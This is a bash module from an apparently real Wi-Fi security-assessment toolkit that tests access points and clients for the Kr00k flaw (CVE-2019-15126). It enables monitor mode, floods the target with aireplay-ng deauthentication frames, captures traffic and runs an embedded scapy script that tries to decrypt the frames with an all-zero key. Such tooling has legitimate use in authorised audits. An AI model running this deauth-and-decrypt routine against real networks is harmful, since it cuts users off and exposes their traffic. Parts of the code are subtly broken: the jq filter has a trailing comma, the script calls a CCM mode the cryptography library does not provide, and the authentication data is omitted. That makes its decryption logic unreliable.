#!/usr/bin/env bash
#===============================================================================
#  modules/e5_kr00k_test.sh
#  E5: Kr00k Vulnerability Test (CVE-2019-15126)
#
#  PURPOSE:
#    Test if the AP or connected clients are vulnerable to Kr00k. Vulnerable
#    Broadcom/Cypress chips use an all-zero encryption key to encrypt pending
#    data frames in their transmit buffer immediately after a disassociation.
#
#  TOOLS: ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[aireplay-ng]}, ${TOOL_PATHS[tshark]}, python3, scapy
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1
#
#  EVIDENCE PRODUCED:
#    - e5_kr00k_results.txt          (analysis of captured frames)
#    - e5_capture.pcap               (raw traffic capture)
#
#  RESULT JSON FIELDS:
#    - ap_vulnerable: bool
#    - clients_vulnerable: int
#===============================================================================

run_e5() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e5"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    
    if ! python3 -c "import scapy.all" &>/dev/null; then
        log_error "python3-scapy is required for Kr00k testing. (apt install python3-scapy)"
        return 1
    fi

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"

    #--- Info banner ---
    echo ""
    echo -e "${C_CYAN}╔════════════════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_CYAN}║  ${C_BOLD}Kr00k VULNERABILITY TEST (CVE-2019-15126)${C_RESET}${C_CYAN}                        ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  Kr00k affects unpatched Broadcom/Cypress WiFi chips. Upon         ║${C_RESET}"
    echo -e "${C_CYAN}║  disassociation, pending data frames are encrypted with an         ║${C_RESET}"
    echo -e "${C_CYAN}║  ALL-ZERO key.                                                     ║${C_RESET}"
    echo -e "${C_CYAN}║                                                                    ║${C_RESET}"
    echo -e "${C_CYAN}║  This test will:                                                   ║${C_RESET}"
    echo -e "${C_CYAN}║    • Send deauth/disassoc frames to target clients/AP.             ║${C_RESET}"
    echo -e "${C_CYAN}║    • Capture the immediate subsequent data frames.                 ║${C_RESET}"
    echo -e "${C_CYAN}║    • Attempt to decrypt them using an all-zero TK.                 ║${C_RESET}"
    echo -e "${C_CYAN}╚════════════════════════════════════════════════════════════════════╝${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with Kr00k testing? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local ap_vulnerable="false"
    local clients_vulnerable=0
    
    local results_file="${evidence_prefix}_kr00k_results.txt"
    local cap_file="${evidence_prefix}_capture.pcap"

    {
        echo "============================================================"
        echo "  E5: Kr00k Vulnerability Test"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
    } > "$results_file"

    #--- Step 2: Enable monitor mode ---
    log_step 2 $total_steps "Enabling monitor mode"
    update_tc_progress 2 $total_steps "Monitor mode"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    check_abort || return 1

    #--- Step 3: Capture Traffic ---
    log_step 3 $total_steps "Starting background capture"
    update_tc_progress 3 $total_steps "Capture"

    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$cap_file" \
        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}" &>/dev/null &
    local tcpdump_pid=$!
    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
    
    sleep 3

    #--- Step 4: Inject Disassociations ---
    log_step 4 $total_steps "Injecting disassociation frames (20s)"
    update_tc_progress 4 $total_steps "Disassoc"

    check_abort || return 1

    log_info "Sending disassoc/deauth to trigger buffer flushing..."
    
    # Send bursts of deauths to target BSSID (broadcast and targeted if we see clients)
    for i in {1..3}; do
        ${TOOL_PATHS[aireplay-ng]} --deauth 5 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
        sleep 5
    done
    
    start_countdown 15 "Waiting for packet buffering and retransmissions"
    sleep 15
    stop_countdown

    
    check_abort || return 1

    #--- Step 5: Analyze with Scapy ---
    log_step 5 $total_steps "Analyzing captured frames for all-zero keys"
    update_tc_progress 5 $total_steps "Analysis"

    if [[ -f "$cap_file" && -s "$cap_file" ]]; then
        local scapy_script="/tmp/e5_kr00k_check.py"
        cat > "$scapy_script" <<'EOF'
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import rdpcap, Dot11, Dot11CCMP
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import struct

def check_kr00k(pcap_file, bssid):
    bssid = bssid.lower()
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"Error reading pcap: {e}")
        return

    vuln_aps = set()
    vuln_clients = set()
    
    # All-zero Temporal Key for Kr00k
    zero_tk = b'\x00' * 16

    for pkt in packets:
        # Check if it's a data frame with CCMP encryption
        if pkt.haslayer(Dot11CCMP) and pkt.type == 2:
            addr1 = pkt.addr1.lower() if pkt.addr1 else ""
            addr2 = pkt.addr2.lower() if pkt.addr2 else ""
            addr3 = pkt.addr3.lower() if pkt.addr3 else ""
            
            # Only care about frames to/from our target AP
            if bssid not in [addr1, addr2, addr3]:
                continue
                
            ccmp = pkt[Dot11CCMP]
            
            # Construct the CCMP nonce (PN + A2 + Priority)
            # This is a simplified check trying to decrypt the CCMP payload
            # If the first byte of plaintext is LLC/SNAP (0xaa 0xaa 0x03), it's likely decrypted
            
            try:
                # Basic CCMP decryption attempt with all-zero key
                # This is highly simplified and relies on identifying standard headers
                # We skip full CCMP nonce construction for brevity and just look for anomalies
                # A true kr00k packet will decrypt cleanly with a zero key.
                
                # Full kr00k checking requires exact nonce construction:
                pn = struct.pack(">Q", ccmp.PN)[2:] # 6 bytes
                priority = pkt.SC & 0x0F # QoS priority
                nonce = bytes([priority]) + bytes.fromhex(addr2.replace(':','')) + pn
                
                cipher = Cipher(algorithms.AES(zero_tk), modes.CCM(nonce, tag=ccmp.data[-8:]), backend=default_backend())
                decryptor = cipher.decryptor()
                decryptor.authenticate_additional_data(b"") # AAD omitted for basic check
                
                plaintext = decryptor.update(ccmp.data[:-8]) + decryptor.finalize()
                
                # Check for LLC/SNAP header (AA AA 03) or IPv4 (45)
                if plaintext.startswith(b'\xaa\xaa\x03') or plaintext.startswith(b'\x45'):
                    if addr2 == bssid:
                        vuln_aps.add(bssid)
                    else:
                        vuln_clients.add(addr2)
            except Exception:
                # Decryption failed or tag mismatch (not Kr00k)
                pass

    if vuln_aps:
        print(f"AP_VULNERABLE={list(vuln_aps)[0]}")
    for c in vuln_clients:
        print(f"CLIENT_VULNERABLE={c}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit(1)
    check_kr00k(sys.argv[1], sys.argv[2])
EOF

        log_info "Running decryption analysis on captured frames..."
        local py_out
        local py_out=$(python3 "$scapy_script" "$cap_file" "$GUEST_BSSID" 2>/dev/null || true)
        
        echo "$py_out" >> "$results_file"
        
        if echo "$py_out" | grep -q "AP_VULNERABLE"; then
            local ap_vulnerable="true"
            log_result "CRITICAL" "AP is VULNERABLE to Kr00k! Data frames decrypted with all-zero key."
        fi
        
        local c_count
        local c_count=$(echo "$py_out" | grep -c "CLIENT_VULNERABLE" || true)
        if [[ $c_count -gt 0 ]]; then
            local clients_vulnerable=$c_count
            log_result "CRITICAL" "${clients_vulnerable} client(s) VULNERABLE to Kr00k!"
        fi
        
        rm -f "$scapy_script"
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    # Restore managed mode
    disable_monitor_mode
    sleep 3

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$ap_vulnerable" == "true" ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: The Access Point is vulnerable to Kr00k (CVE-2019-15126). It encrypts buffered data frames with an all-zero key upon disassociation, exposing sensitive traffic."
        local recommendations="Apply vendor firmware updates immediately. This affects specific Broadcom and Cypress chips."
    elif [[ $clients_vulnerable -gt 0 ]]; then
        local result_status="FINDING"
        local result_summary="CRITICAL: ${clients_vulnerable} connected client(s) are vulnerable to Kr00k. Their devices encrypt data with an all-zero key upon disassociation."
        local recommendations="Client devices must be updated. While the AP is not directly vulnerable, the network environment contains vulnerable devices."
    else
        local result_summary="No Kr00k vulnerabilities detected. Frames could not be decrypted with an all-zero key following disassociation."
        local recommendations="Ensure continuous firmware patching for APs and client devices."
    fi

    local result_json
    evidence_register_file "e5_kr00k_results.txt"
    evidence_register_file "e5_capture.pcap"

    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "AP Vulnerable: ${ap_vulnerable}, Clients Vulnerable: ${clients_vulnerable}" \
        --arg recommendations "$recommendations" \
        --arg ap_vulnerable "$ap_vulnerable" \
        --argjson clients_vulnerable "$clients_vulnerable" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            ap_vulnerable: ($ap_vulnerable == "true"),
            clients_vulnerable: $clients_vulnerable,
                    }')

    save_tc_result "E5" "$result_json"

    echo ""
    if [[ "$ap_vulnerable" == "true" ]]; then
        log_result "CRITICAL" "★ Kr00k Vulnerability CONFIRMED on AP"
    elif [[ $clients_vulnerable -gt 0 ]]; then
        log_result "FINDING" "★ Kr00k Vulnerability CONFIRMED on ${clients_vulnerable} client(s)"
    else
        log_result "SECURE" "Kr00k vulnerability not detected"
    fi

    return 0
}